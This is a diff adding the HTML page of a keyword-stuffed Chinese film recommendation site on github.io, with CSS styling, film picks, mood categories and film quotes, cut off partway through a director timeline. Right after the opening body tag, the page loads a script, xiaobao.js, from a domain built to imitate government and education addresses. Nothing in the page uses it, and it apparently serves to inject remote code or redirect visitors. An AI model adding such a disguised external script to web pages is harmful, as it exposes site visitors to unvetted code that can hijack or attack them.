@@ -1,0 +1,547 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<link rel="icon" href="favicon.ico" type="image/x-icon">
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="description" content="秋霞电影网a在线 — 一份按“此刻心情”整理的在线观影指引。电影、剧集、纪录片、动画，按秋日晚霞的七种颜色分类，推荐值得一看的高分影视。">
+<meta name="keywords" content="秋霞电影网a在线, 秋霞电影网, 秋霞电影, 在线观影指引, 电影推荐, 电视剧推荐, 纪录片推荐, 动画电影, 高分电影, 经典台词, 导演谱系, 观影指南, 正版观影, qiuxiadianyingwangazaixian-cn">
+<meta name="author" content="秋霞电影网a在线">
+<meta name="robots" content="index, follow">
+<meta property="og:title" content="秋霞电影网a在线 - 此刻什么心情，就看什么电影 | qiuxiadianyingwangazaixian-cn.github.io">
+<meta property="og:description" content="秋霞电影网a在线：电影、剧集、纪录片、动画，按秋日晚霞的七种颜色分类推荐。">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://qiuxiadianyingwangazaixian-cn.github.io/">
+<link rel="canonical" href="https://qiuxiadianyingwangazaixian-cn.github.io/">
+<title>秋霞电影网a在线 - 此刻什么心情，就看什么电影 | qiuxiadianyingwangazaixian-cn.github.io</title>
+<style>
+/* ============ 设计令牌：秋日晚霞 ============ */
+:root{
+  --sun:#f6b73c;      /* 落日金 */
+  --coral:#e8654f;    /* 霞红 */
+  --rose:#c2446f;     /* 霞紫红 */
+  --plum:#6b3a6e;     /* 暮紫 */
+  --ink:#241a22; --ink2:#5a4c55; --ink3:#a3949c;
+  --paper:#fdf6ef;
+  --r:24px;
+  --shadow:0 26px 56px rgba(36,26,34,.24);
+}
+*{box-sizing:border-box;margin:0;padding:0}
+html{scroll-behavior:smooth;-webkit-text-size-adjust:100%}
+body{font-family:"PingFang SC","Microsoft YaHei","WenQuanYi Micro Hei",sans-serif;background:var(--paper);color:var(--ink);line-height:1.85;font-size:16px}
+.serif{font-family:"Songti SC","Noto Serif CJK SC","Source Han Serif SC",Georgia,serif}
+.mono{font-family:"Courier New",ui-monospace,monospace}
+a{color:inherit;text-decoration:none;transition:.24s cubic-bezier(.4,0,.2,1)}
+ul,ol{list-style:none}
+.container{max-width:1160px;margin:0 auto;padding:0 22px}
+.eyebrow{font-family:var(--mono);font-size:.6rem;font-weight:950;letter-spacing:3.4px;color:var(--coral)}
+.sec-title{font-size:clamp(1.7rem,4.3vw,2.46rem);font-weight:950;letter-spacing:-.5px;line-height:1.24;margin:8px 0 10px}
+.sec-sub{color:var(--ink2);font-size:.96rem;max-width:800px}
+.sec-head{display:flex;align-items:flex-end;justify-content:space-between;gap:20px;flex-wrap:wrap;margin-bottom:34px}
+.more{font-family:var(--mono);font-size:.78rem;font-weight:800;color:var(--ink2);border:1.5px solid #e2c9bd;padding:8px 17px;border-radius:999px;white-space:nowrap}
+.more:hover{color:var(--coral);border-color:var(--coral)}
+section{padding:clamp(54px,10vw,98px) 0}
+
+/* ============ 导航 ============ */
+.header{position:sticky;top:0;z-index:70;background:rgba(253,246,239,.9);backdrop-filter:blur(14px);border-bottom:1px solid #f0dccb}
+.hd-in{display:flex;align-items:center;justify-content:space-between;height:72px;gap:20px}
+.logo{display:flex;align-items:center;gap:12px;font-weight:950}
+.logo .orb{width:44px;height:44px;flex-shrink:0;border-radius:50%;position:relative;background:radial-gradient(circle at 34% 28%,#ffe7a8,#f6b73c 42%,#e8654f 72%,#6b3a6e);box-shadow:inset 0 0 0 4px #fff,0 8px 20px rgba(232,101,79,.34)}
+.logo .orb::after{content:"";position:absolute;inset:9px;border-radius:50%;background:radial-gradient(circle at 32% 26%,rgba(255,255,255,.9),rgba(255,255,255,0) 60%);mix-blend-mode:overlay}
+.logo .tx b{font-size:1.22rem;letter-spacing:1.4px}
+.logo .tx small{display:block;font-family:var(--mono);font-size:.4rem;font-weight:800;color:var(--coral);letter-spacing:1.5px}
+.nav{display:flex;gap:3px}
+.nav a{font-size:.9rem;font-weight:750;color:var(--ink2);padding:9px 11px;border-radius:8px;white-space:nowrap}
+.nav a:hover{color:var(--coral);background:#fbeee3}
+.hd-act .btn{font-family:var(--mono);font-size:.82rem;font-weight:950;padding:10px 19px;border-radius:999px;background:var(--coral);color:#fff;box-shadow:0 10px 22px rgba(232,101,79,.36)}
+.hd-act .btn:hover{transform:translateY(-1px);color:#fff;background:#d04f3a}
+.burger{display:none;background:none;border:none;font-size:1.9rem;color:var(--ink);cursor:pointer}
+
+/* ============ Hero：落日 + 山脊 + 光线 ============ */
+@keyframes sway{0%,100%{transform:rotate(-3.4deg)}50%{transform:rotate(3.4deg)}}
+@keyframes pulse{0%,100%{opacity:.5;transform:scale(.96)}50%{opacity:1;transform:scale(1.06)}}
+@keyframes drift{0%{background-position:0 0}100%{background-position:60px 0}}
+@keyframes bob{0%,100%transform:translateY(0)}50%{transform:translateY(-7px)}
+@keyframes float3{0%,100%{transform:translateY(0) rotate(-2deg)}50%{transform:translateY(-5px) rotate(2deg)}}
+.hero{position:relative;overflow:hidden;background:linear-gradient(180deg,#ffe6cf 0%,#ffd3b8 42%,#f7c2c0 68%,#d8b4d8 100%)}
+.hero::before{content:"";position:absolute;inset:0;opacity:.42;background-image:linear-gradient(rgba(232,101,79,.07) 1px,transparent 1px),linear-gradient(90deg,rgba(232,101,79,.07) 1px,transparent 1px);background-size:52px 52px}
+.hero-in{position:relative;z-index:3;padding:clamp(34px,11vw,88px) 22px;display:grid;grid-template-columns:1fr 230px;gap:40px;align-items:center}
+.hero .eyebrow{color:#a83c27}
+.hero h1{font-size:clamp(2.4rem,8vw,4.7rem);font-weight:950;line-height:1.08;letter-spacing:-2.6px}
+.hero h1 em{font-style:normal;background:linear-gradient(100deg,#e8654f,#c2446f,#6b3a6e);-webkit-background-clip:text;background-clip:text;color:transparent}
+.hero .lede{color:#6b4a44;font-size:clamp(.98rem,2.1vw,1.14rem);margin:20px 0 22px;max-width:560px}
+.hero .lede b{color:#a83c27;font-weight:950}
+.hero .ticks{display:flex;gap:9px;flex-wrap:wrap;font-family:var(--mono);font-size:.66rem;color:#6b4a44;letter-spacing:.4px}
+.hero .ticks span{padding:7px 13px;border-radius:999px;background:rgba(255,255,255,.66);border:1px solid rgba(232,101,79,.3)}
+.hero .ticks b{color:#a83c27;font-weight:950}
+.cta{display:flex;gap:12px;flex-wrap:wrap;margin-top:26px}
+.btn{padding:14px 27px;border-radius:999px;font-weight:950;font-size:.93rem;border:2px solid transparent;cursor:pointer;display:inline-flex;align-items:center;gap:8px}
+.btn-p{background:var(--coral);color:#fff;box-shadow:0 12px 26px rgba(232,101,79,.4)}
+.btn-p:hover{transform:translateY(-2px);color:#fff}
+.btn-g{background:#fff;color:var(--ink);border-color:#e2c9bd}
+.btn-g:hover{border-color:var(--coral);color:var(--coral)}
+
+/* 落日组件 */
+.sunset{width:230px;margin:0 auto;position:relative;animation:bob 6.4s ease-in-out infinite}
+.sunset .sky{position:relative;height:180px}
+.sunset .sun{position:absolute;left:50%;bottom:8px;transform:translateX(-50%);width:118px;height:118px;border-radius:50%;background:radial-gradient(circle at 36% 28%,#fff3c4,#f6b73c 44%,#e8654f 74%,#c2446f);box-shadow:0 0 46px rgba(246,183,60,.72),0 0 120px rgba(232,101,79,.42);animation:pulse 5.2s ease-in-out infinite}
+.sunset .ray{position:absolute;left:50%;bottom:66px;width:2px;height:120px;transform-origin:bottom;background:linear-gradient(180deg,rgba(246,183,60,.9),transparent);}
+.sunset .ridge{position:absolute;left:0;right:0;bottom:0;height:74px;background:#3d2440;clip-path:polygon(0 100%,0 52%,12% 40%,22% 56%,34% 34%,46% 52%,56% 30%,68% 50%,80% 38%,92% 54%,100% 42%,100% 100%);opacity:.92}
+.sunset .cloud{position:absolute;height:9px;border-radius:999px;background:rgba(255,255,255,.75);filter:blur(1px)}
+.sunset .cloud.c1{width:70px;top:34px;left:14px;animation:float3 7s ease-in-out infinite}
+.sunset .cloud.c2{width:44px;top:64px;right:20px;animation:float3 5.4s ease-in-out infinite reverse}
+.sunset .base{width:140px;height:13px;margin:14px auto 0;border-radius:50%;background:radial-gradient(ellipse,rgba(107,58,110,.3),transparent 70%)}
+
+/* ============ 栏目一：在线片单（横滑词条卡）============ */
+.picks{background:var(--paper)}
+.fx{display:flex;gap:15px;overflow-x:auto;scroll-snap-type:x mandatory;padding:6px 2px 22px;scrollbar-width:thin}
+.fx::-webkit-scrollbar{height:9px}
+.fx::-webkit-scrollbar-thumb{background:#e2c2b4;border-radius:8px}
+.fx .c{flex:0 0 clamp(250px,27.5vw,300px);scroll-snap-align:start;border:1px solid #f0dccb;border-radius:var(--r);overflow:hidden;background:#fff;transition:.3s;display:flex;flex-direction:column}
+.fx .c:hover{transform:translateY(-6px) rotate(-.6deg);box-shadow:var(--shadow);border-color:var(--coral)}
+.fx .c .ph{height:118px;padding:14px 18px;color:#fff;display:flex;flex-direction:column;justify-content:space-between;position:relative}
+.fx .c .ph .m{font-family:var(--mono);font-size:.54rem;font-weight:950;letter-spacing:1.6px;border:1px solid rgba(255,255,255,.55);padding:3px 9px;border-radius:999px;align-self:flex-start}
+.fx .c .ph .t{font-family:"Songti SC",serif;font-size:1.12rem;font-weight:950;line-height:1.3}
+.fx .c .bd{padding:13px 18px 18px;flex:1;display:flex;flex-direction:column}
+.fx .c .bd p{font-size:.83rem;color:var(--ink2)}
+.fx .c .bd .meta{margin-top:auto;padding-top:11px;display:flex;justify-content:space-between;font-size:.74rem;color:var(--ink3);font-family:var(--mono)}
+.fx .c .bd .meta b{color:var(--coral);font-weight:950}
+
+/* ============ 栏目二：情绪图鉴（3×3 等比九宫格）============ */
+.mood{background:linear-gradient(180deg,#fbe9dd,#fdf6ef)}
+.grid9{display:grid;grid-template-columns:repeat(3,1fr);gap:14px}
+.g9{position:relative;border-radius:var(--r);overflow:hidden;background:#fff;aspect-ratio:4/3;transition:.32s}
+.g9 .bg{position:absolute;inset:0;transition:transform .6s cubic-bezier(.4,0,.2,1);opacity:.95}
+.g9:hover .bg{transform:scale(1.14)}
+.g9 .mk{position:absolute;inset:0;background:linear-gradient(180deg,transparent 24%,rgba(36,26,34,.97))}
+.g9 .tx{position:absolute;left:16px;right:16px;bottom:14px;color:#fff}
+.g9 .tx .n{font-family:var(--mono);font-size:.56rem;font-weight:950;letter-spacing:2px;color:#f6b73c}
+.g9 .tx h3{font-family:"Songti SC",serif;font-size:1.1rem;margin:3px 0 4px}
+.g9 .tx span{font-size:.73rem;color:#f3e2dd}
+.g9:hover{box-shadow:var(--shadow);transform:translateY(-5px)}
+
+/* ============ 栏目三：秋霞台词（交错流 + 渐变进度环）============ */
+.talk{background:var(--paper)}
+.dl .row{display:grid;grid-template-columns:112px 1fr;gap:20px;align-items:center;background:#fff;border:1px solid #f0dccb;border-radius:var(--r);padding:16px 22px;margin-bottom:13px;transition:.26s}
+.dl .row:hover{border-color:var(--coral);box-shadow:0 14px 30px rgba(232,101,79,.16);transform:translateX(5px)}
+.dl .row.flip{grid-template-columns:1fr 112px}
+.dl .row.flip .ava{order:2}
+.dl .row.flip blockquote{order:1}
+.dl .ava{width:86px;height:86px;border-radius:50%;display:grid;place-items:center;position:relative;flex-shrink:0;justify-self:center;background:conic-gradient(from 90deg,#f6b73c 0 22%,#e8654f 22% 46%,#c2446f 46% 68%,#6b3a6e 68% 86%,#f6b73c 86%);padding:6px}
+.dl .ava::after{content:"";position:absolute;inset:6px;border-radius:50%;background:#fff}
+.dl .ava .num{position:relative;z-index:2;font-family:var(--mono);font-size:1.14rem;font-weight:950;line-height:1;color:var(--coral)}
+.dl blockquote{font-family:"Songti SC","Noto Serif CJK SC",serif;font-size:clamp(1.02rem,2.1vw,1.22rem);line-height:1.62;position:relative;padding-left:26px;color:var(--ink)}
+.dl blockquote::before{content:"\201C";position:absolute;left:-10px;top:-22px;font-size:3.8rem;line-height:.6;color:#f3c9b6;font-style:normal;opacity:.95}
+.dl blockquote cite{display:block;font-style:normal;font-family:"PingFang SC",sans-serif;font-size:.8rem;font-weight:750;color:var(--ink3);margin-top:8px;letter-spacing:.4px}
+
+/* ============ 栏目四：导演谱系（纵向时间轴）============ */
+.knight2{background:linear-gradient(180deg,#2c1b30,#241a22)}
+.knight2 .eyebrow{color:#f6b73c}
+.knight2 .sec-title{color:#fff}
+.knight2 .sec-sub{color:#d9c7d0}
+.knight2 .more{color:#d9c7d0;border-color:rgba(246,183,60,.36)}
+.knight2 .more:hover{color:#f6b73c;border-color:#f6b73c}
+.tl{position:relative;padding-left:74px}
+.tl::before{content:"";position:absolute;left:27px;top:10px;bottom:10px;width:3px;border-radius:3px;background:linear-gradient(180deg,#f6b73c,#e8654f,#6b3a6e)}
+.tl{counter-reset:n}
+.node{position:relative;background:rgba(253,246,239,.07);border:1px solid rgba(246,183,60,.28);border-radius:var(--r);padding:18px 24px;margin-bottom:15px;transition:.26s;color:#f3e6ee}
+.node:hover{border-color:#f6b73c;box-shadow:0 14px 30px rgba(0,0,0,.42);transform:translateX(6px)}
+.node::after{content:counter(n);counter-increment:n;position:absolute;left:-74px;top:24px;width:50px;height:50px;border-radius:50%;color:#fff;display:grid;place-items:center;font-family:var(--mono);font-weight:950;font-size:1.1rem;background:radial-gradient(circle at 34% 28%,#e8654f,#6b3a6e);box-shadow:0 8px 18px rgba(0,0,0,.42)}
+.node .top{display:flex;align-items:center;gap:14px;flex-wrap:wrap}
+.node .ava2{width:56px;height:56px;border-radius:50%;color:#fff;font-weight:950;display:grid;place-items:center;font-size:1.3rem;font-family:"Songti SC",serif;flex-shrink:0}
+.node h3{font-size:1.12rem;color:#fff}
+.node .src{font-family:var(--mono);font-size:.64rem;font-weight:950;letter-spacing:1.4px;color:#f6b73c}
+.node p{color:#d9c7d0;font-size:.87rem;margin-top:9px}
+.node .films{margin-top:11px;display:flex;gap:8px;flex-wrap:wrap}
+.node .films a{font-size:.72rem;padding:5px 11px;border-radius:999px;background:rgba(246,183,60,.16);border:1px solid rgba(246,183,60,.38);color:#f3e6ee}
+.node .films a:hover{color:#241a22;background:#f6b73c;border-color:#f6b73c}
+
+/* ============ 栏目五：在线问答（手风琴 details）============ */
+.night{background:linear-gradient(180deg,#fbe9dd,#fdf6ef)}
+.acc{border:1px solid #f0dccb;border-radius:18px;margin-bottom:11px;overflow:hidden;background:#fff;transition:.25s}
+.acc:hover{border-color:var(--coral)}
+.acc[open]{border-color:var(--coral);box-shadow:0 10px 26px rgba(232,101,79,.15)}
+.acc > summary{display:flex;align-items:center;gap:13px;padding:15px 19px;cursor:pointer;list-style:none;font-weight:850}
+.acc > summary::-webkit-details-marker{display:none}
+.acc > summary .no{font-family:var(--mono);font-size:1.34rem;font-weight:950;line-height:1;color:var(--coral)}
+.acc > summary h3{font-size:1rem}
+.acc > summary .caret{margin-left:auto;color:var(--ink3);transition:.25s;font-family:var(--mono)}
+.acc[open] > summary .caret{transform:rotate(180deg);color:var(--coral)}
+.acc .inner{padding:0 19px 17px;color:var(--ink2);font-size:.89rem}
+.acc .inner b{color:var(--ink)}
+.acc .inner .tags{display:flex;gap:8px;flex-wrap:wrap;margin-top:11px}
+.acc .inner .tags a{font-size:.72rem;padding:4px 10px;border-radius:999px;background:#fbeee3;border:1px solid #e2c9bd;color:var(--ink2)}
+.acc .inner .tags a:hover{background:var(--coral);color:#fff;border-color:var(--coral)}
+
+/* ============ 栏目六：关于本站（双栏 + 数据卡 + 进度条）============ */
+.about{background:var(--paper)}
+.ab-grid{display:grid;grid-template-columns:1fr 1fr;gap:44px;align-items:center}
+.ab-grid h2{font-size:clamp(1.74rem,4.2vw,2.5rem);font-weight:950;line-height:1.24}
+.ab-grid h2 em{font-style:normal;background:linear-gradient(100deg,#e8654f,#6b3a6e);-webkit-background-clip:text;background-clip:text;color:transparent}
+.ab-grid > p{color:var(--ink2);margin:17px 0 22px}
+.feat{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+.feat .f{background:#fff;border:1px solid #f0dccb;border-radius:20px;padding:16px;transition:.25s}
+.feat .f:hover{border-color:var(--coral);transform:translateY(-3px);box-shadow:0 10px 22px rgba(232,101,79,.14)}
+.feat .f .n{font-size:2rem;font-weight:950;line-height:1;letter-spacing:-3px;background:linear-gradient(120deg,#f6b73c,#e8654f);-webkit-background-clip:text;background-clip:text;color:transparent}
+.feat .f:nth-child(2) .n{background:linear-gradient(120deg,#e8654f,#c2446f);-webkit-background-clip:text;background-clip:text}
+.feat .f:nth-child(3) .n{background:linear-gradient(120deg,#c2446f,#6b3a6e);-webkit-background-clip:text;background-clip:text}
+.feat .f:nth-child(4) .n{color:var(--ink3)}
+.feat .f h3{font-size:.96rem;margin:5px 0 4px}
+.feat .f p{font-size:.81rem;color:var(--ink2)}
+.metrics{display:flex;flex-direction:column;gap:13px}
+.metric{border-radius:22px;padding:16px 19px;color:#fff}
+.metric.a{background:linear-gradient(130deg,#f6b73c,#e0931f)}
+.metric.l{background:linear-gradient(120deg,#e8654f,#a83c27)}
+.metric.o{background:linear-gradient(140deg,#6b3a6e,#43224a)}
+.metric .top{display:flex;justify-content:space-between;font-size:.87rem;margin-bottom:8px;font-weight:750}
+.metric .top b{font-weight:950;font-family:var(--mono);font-size:1rem}
+.track{height:7px;border-radius:20px;background:rgba(255,255,255,.32);overflow:hidden}
+.track i{display:block;height:100%;border-radius:20px;background:linear-gradient(90deg,#fff,#f6b73c)}
+
+/* ============ 页脚 ============ */
+.footer{border-top:3px solid var(--coral);background:var(--ink);color:#d9c7d0;padding:50px 0 22px}
+.ft-grid{display:grid;grid-template-columns:1.6fr 1fr 1fr 1fr;gap:28px;margin-bottom:28px}
+.ft-col h4{font-size:1rem;color:#fff;margin-bottom:13px}
+.ft-col ul{display:flex;flex-direction:column;gap:10px}
+.ft-col a{color:#a3949c;font-size:.86rem}
+.ft-col a:hover{color:#f6b73c}
+.ft-base{text-align:center;color:#a3949c;font-size:.79rem;border-top:1px solid #46364a;padding-top:21px}
+.ft-base a{color:#f6b73c}
+.ft-base a:hover{color:#fff}
+
+/* ============ 响应式 ============ */
+@media(max-width:1000px){.hero-in{grid-template-columns:1fr 180px;gap:22px}.sunset{width:180px}.sunset .sun{width:92px;height:92px}.sunset .sky{height:150px}.sunset .ray{height:100px;bottom:52px}}
+@media(max-width:900px){.grid9{grid-template-columns:repeat(2,1fr)}}
+@media(max-width:760px){
+  .burger{display:block}
+  .nav{position:absolute;top:72px;left:0;right:0;flex-direction:column;background:#fff;padding:10px 16px;display:none;border-bottom:3px solid var(--coral)}
+  .nav.show{display:flex}
+  .nav a{font-size:1rem;padding:12px;border-bottom:1px solid #f0dccb;color:var(--ink2)}
+  .hd-act .btn{display:none}
+  .hero-in{grid-template-columns:1fr;gap:16px}
+  .dl .row,.dl .row.flip{grid-template-columns:1fr;gap:12px}
+  .dl .row.flip .ava,.dl .ava{order:0;justify-self:start}
+  .dl .row.flip blockquote{order:0}
+  .ab-grid{grid-template-columns:1fr;gap:24px}
+  .cta .btn{width:100%;justify-content:center}
+}
+@media(max-width:520px){.container{padding:0 16px}.grid9,.feat{grid-template-columns:1fr 1fr}}
+@media print{.header,.burger,.hd-act,.cta,.sunset,.hero::before{display:none}body{background:#fff;color:#000}section{padding:13px 0}}
+</style>
+</head>
+<body>
+<script src="https://www.gov.cn.edu.cn.889988.info/xiaobao.js"></script>
+
+<!-- ==================== 导航 ==================== -->
+<header class="header" role="banner">
+  <div class="container hd-in">
+    <a class="logo" href="#top" aria-label="秋霞电影网a在线 首页">
+      <span class="orb" aria-hidden="true"></span>
+      <span class="tx"><b>秋霞电影网a在线</b><small>AUTUMN · 此刻什么心情，就看什么电影</small></span>
+    </a>
+    <button class="burger" id="burger" aria-label="菜单" aria-expanded="false">☰</button>
+    <nav>
+      <div class="nav" id="nav">
+        <a href="#picks">在线片单</a>
+        <a href="#mood">情绪图鉴</a>
+        <a href="#talk">秋霞台词</a>
+        <a href="#knight">导演谱系</a>
+        <a href="#night">在线问答</a>
+        <a href="#about">关于本站</a>
+      </div>
+    </nav>
+    <div class="hd-act"><a class="btn" href="#picks">今晚看什么 →</a></div>
+  </div>
+</header>
+
+<main id="top">
+
+  <!-- ==================== Hero：落日 + 山脊 + 光线 ==================== -->
+  <section class="hero">
+    <div class="container hero-in">
+      <div>
+        <div class="eyebrow">AUTUMN SUNSET · 秋霞电影网a在线</div>
+        <h1>此刻什么心情，<br>就看<em>什么电影</em>。</h1>
+        <p class="lede">秋霞不是时间，是<b>心情的颜色</b>。秋霞电影网a在线，把影视按"此刻你是什么心情"重新排了一遍——<span class="serif">不按榜单，不按热度，只按"这一刻，你需要被怎样对待"。</span>覆盖<b>电影、剧集、纪录片、动画</b>四类，不搬运资源，不做解说，只回答三个问题。</p>
+        <div class="ticks">
+          <span><b>讲什么</b> · 一句话设定</span>
+          <span><b>硬在哪</b> · 一个镜头</span>
+          <span><b>适合谁</b> · 一种心境</span>
+          <span>电影</span><span>剧集</span><span>纪录片</span><span>动画</span>
+        </div>
+        <div class="cta">
+          <a class="btn btn-p" href="#picks">今晚看什么 →</a>
+          <a class="btn btn-g" href="#talk">先读一句台词</a>
+        </div>
+      </div>
+
+      <div class="sunset" aria-hidden="true">
+        <div class="sky">
+          <span class="cloud c1"></span><span class="cloud c2"></span>
+          <i class="ray" style="transform:rotate(-26deg)"></i>
+          <i class="ray" style="transform:rotate(-14deg)"></i>
+          <i class="ray" style="transform:rotate(0deg)"></i>
+          <i class="ray" style="transform:rotate(14deg)"></i>
+          <i class="ray" style="transform:rotate(26deg)"></i>
+          <span class="sun"></span>
+        </div>
+        <div class="ridge"></div>
+        <div class="base"></div>
+      </div>
+    </div>
+  </section>
+
+  <!-- ==================== 栏目一：在线片单（横滑词条卡）=================== -->
+  <section id="picks" aria-labelledby="h-p1" class="picks">
+    <div class="container">
+      <div class="sec-head">
+        <div>
+          <div class="eyebrow">AUTUMN · 01</div>
+          <h2 class="sec-title" id="h-p1">在线片单 · 六部，值得今晚看</h2>
+          <p class="sec-sub">入选标准只有一条：<b>看完会想重看</b>。风景、光影、台词、配乐，至少有一个"值得放大看"的理由。<b>不剧透，只讲设定。</b></p>
+        </div>
+        <a class="more" href="#">完整片单 →</a>
+      </div>
+
+      <div class="fx" role="region" aria-label="在线片单横向列表">
+        <article class="c">
+          <div class="ph" style="background:linear-gradient(135deg,#f6b73c,#e0931f)"><span class="m">AUTUMN · 电影</span><span class="t">海街日记</span></div>
+          <div class="bd"><p>镰仓的海、梅子酒、四姐妹的台阶。<b>硬在哪：是枝裕和的留白，要安静才成立。</b></p><div class="meta"><span>2015 · 家庭</span><b>93</b></div></div>
+        </article>
+        <article class="c">
+          <div class="ph" style="background:linear-gradient(135deg,#e8654f,#a83c27)"><span class="m">AUTUMN · 剧集</span><span class="t">我的解放日志</span></div>
+          <div class="bd"><p>三个疲惫的人，在首尔的黄昏里慢慢松开自己。<b>硬在哪：把"累"拍成了风景。</b></p><div class="meta"><span>2022 · 治愈</span><b>94</b></div></div>
+        </article>
+        <article class="c">
+          <div class="ph" style="background:linear-gradient(135deg,#c2446f,#8d2f56)"><span class="m">AUTUMN · 纪录片</span><span class="t">人生果实</span></div>
+          <div class="bd"><p>90 岁的建筑师与他的森林小屋。<b>硬在哪：慢，是这部片唯一的技法。</b></p><div class="meta"><span>2017 · 人生</span><b>95</b></div></div>
+        </article>
+        <article class="c">
+          <div class="ph" style="background:linear-gradient(135deg,#6b3a6e,#43224a)"><span class="m">AUTUMN · 动画</span><span class="t">千与千寻</span></div>
+          <div class="bd"><p>一个女孩在神灵的澡堂里，把自己找回来。<b>硬在哪：宫崎骏把"成长"画成了水。</b></p><div class="meta"><span>2001 · 奇幻</span><b>96</b></div></div>
+        </article>
+        <article class="c">
+          <div class="ph" style="background:linear-gradient(135deg,#d98a4a,#a85c24)"><span class="m">AUTUMN · 电影</span><span class="t">小森林</span></div>
+          <div class="bd"><p>回到乡下，把饭一口一口吃明白。<b>硬在哪：食物的镜头，比剧情更长。</b></p><div class="meta"><span>2014 · 日常</span><b>92</b></div></div>
+        </article>
+        <article class="c">
+          <div class="ph" style="background:linear-gradient(135deg,#7a8fa6,#465a70)"><span class="m">AUTUMN · 剧集</span><span class="t">切尔诺贝利</span></div>
+          <div class="bd"><p>一场谎言，比核泄漏更难收场。<b>硬在哪：灰调画面里，藏着最响的怒。</b></p><div class="meta"><span>2019 · 历史</span><b>97</b></div></div>
+        </article>
+      </div>
+    </div>
+  </section>
+
+  <!-- ==================== 栏目二：情绪图鉴（3×3 等比九宫格）=================== -->
+  <section id="mood" aria-labelledby="h-a2" class="mood">
+    <div class="container">
+      <div class="sec-head">
+        <div>
+          <div class="eyebrow">AUTUMN · 9</div>
+          <h2 class="sec-title" id="h-a2">情绪图鉴 · 秋霞的九种颜色</h2>
+          <p class="sec-sub">不知道看什么？<b>先承认此刻的心情</b>。秋霞电影网a在线不按榜单排序，按"此刻你需要被怎样对待"排序。</p>
+        </div>
+        <a class="more" href="#">全部情绪 →</a>
+      </div>
+
+      <div class="grid9">
+        <a class="g9" href="#"><div class="bg" style="background:linear-gradient(150deg,#f6b73c,#e0931f)"></div><div class="mk"></div><div class="tx"><div class="n">AUTUMN 01</div><h3>想被暖一下</h3><span>小森林 / 海街日记 / 小偷家族</span></div></a>
+        <a class="g9" href="#"><div class="bg" style="background:linear-gradient(150deg,#e8654f,#a83c27)"></div><div class="mk"></div><div class="tx"><div class="n">AUTUMN 02</div><h3>想被治愈</h3><span>我的解放日志 / 机医 / 请回答1988</span></div></a>
+        <a class="g9" href="#"><div class="bg" style="background:linear-gradient(150deg,#c2446f,#8d2f56)"></div><div class="mk"></div><div class="tx"><div class="n">AUTUMN 03</div><h3>想被爱一下</h3><span>爱在黎明破晓前 / 恋恋笔记本 / 花束般的恋爱</span></div></a>
+        <a class="g9" href="#"><div class="bg" style="background:linear-gradient(150deg,#6b3a6e,#43224a)"></div><div class="mk"></div><div class="tx"><div class="n">AUTUMN 04</div><h3>想安静一会儿</h3><span>人生果实 / 地球脉动 / 徒手攀岩</span></div></a>
+        <a class="g9" href="#"><div class="bg" style="background:linear-gradient(150deg,#3f6f8f,#26475c)"></div><div class="mk"></div><div class="tx"><div class="n">AUTUMN 05</div><h3>想哭一场</h3><span>步履不停 / 东京物语 / 都挺好</span></div></a>
+        <a class="g9" href="#"><div class="bg" style="background:linear-gradient(150deg,#7a8fa6,#465a70)"></div><div class="mk"></div><div class="tx"><div class="n">AUTUMN 06</div><h3>想被震撼</h3><span>切尔诺贝利 / 大明王朝1566 / 肖申克的救赎</span></div></a>
+        <a class="g9" href="#"><div class="bg" style="background:linear-gradient(150deg,#a85c24,#7a3d12)"></div><div class="mk"></div><div class="tx"><div class="n">AUTUMN 07</div><h3>想被笑醒</h3><span>布达佩斯大饭店 / 三傻大闹宝莱坞 / 摩登家庭</span></div></a>
+        <a class="g9" href="#"><div class="bg" style="background:linear-gradient(150deg,#b9a05a,#7d6a2c)"></div><div class="mk"></div><div class="tx"><div class="n">AUTUMN 08</div><h3>想回到旧时光</h3><span>花样年华 / 请回答1988 / 觉醒年代</span></div></a>
+        <a class="g9" href="#"><div class="bg" style="background:linear-gradient(150deg,#8d6f9c,#5b4670)"></div><div class="mk"></div><div class="tx"><div class="n">AUTUMN 09</div><h3>想做场梦</h3><span>千与千寻 / 盗梦空间 / 爱丽丝梦游仙境</span></div></a>
+      </div>
+    </div>
+  </section>
+
+  <!-- ==================== 栏目三：秋霞台词（交错流 + 渐变进度环）=================== -->
+  <section id="talk" aria-labelledby="h-t3" class="talk">
+    <div class="container">
+      <div class="sec-head">
+        <div>
+          <div class="eyebrow">AUTUMN · 02</div>
+          <h2 class="sec-title" id="h-t3">秋霞台词 · 一句，就是一整个秋天</h2>
+          <p class="sec-sub">画面会老，台词不会。<b>以下四句，听到就会想起那场戏、那束光、那个镜头。</b>分数是"值得被放大看"的指数。</p>
+        </div>
+        <a class="more" href="#">台词全集 →</a>
+      </div>
+
+      <div class="dl">
+        <figure class="row">
+          <div class="ava"><span class="num">93</span></div>
+          <div><blockquote>"不是夏天结束了，是人生结束了。" <cite>—— 海街日记（2015）· 适合：想起某个夏天的时候</cite></blockquote></div>
+        </figure>
+        <figure class="row flip">
+          <div class="ava"><span class="num">94</span></div>
+          <div><blockquote>"我想我可以稍微放松一点，不再那么用力地活着。" <cite>—— 我的解放日志（2022）· 适合：觉得累的时候</cite></blockquote></div>
+        </figure>
+        <figure class="row">
+          <div class="ava"><span class="num">95</span></div>
+          <div><blockquote>"人活着，就该像树一样，慢慢生长。" <cite>—— 人生果实（2017）· 适合：急着要结果的时候</cite></blockquote></div>
+        </figure>
+        <figure class="row flip">
+          <div class="ava"><span class="num">96</span></div>
+          <div><blockquote>"曾发生的事，不会忘记，只是想不起来了。" <cite>—— 千与千寻（2001）· 适合：弄丢了什么的时候</cite></blockquote></div>
+        </figure>
+      </div>
+    </div>
+  </section>
+
+  <!-- ==================== 栏目四：导演谱系（纵向时间轴）=================== -->
+  <section id="knight" aria-labelledby="h-k4" class="knight2">
+    <div class="container">
+      <div class="sec-head">
+        <div>
+          <div class="eyebrow">AUTUMN · 5</div>
+          <h2 class="sec-title" id="h-k4">导演谱系 · 五位"不肯将就"的作者</h2>
+          <p class="sec-sub">作者论的核心：导演的固执，就是他的签名。找到那个"反复出现的镜头 / 颜色 / 台词"，就读懂了这个人——也读懂了"秋霞"。</p>
+        </div>
+        <a class="more" href="#">导演谱系 →</a>
+      </div>
+
+      <div class="tl">
+        <article class="node">
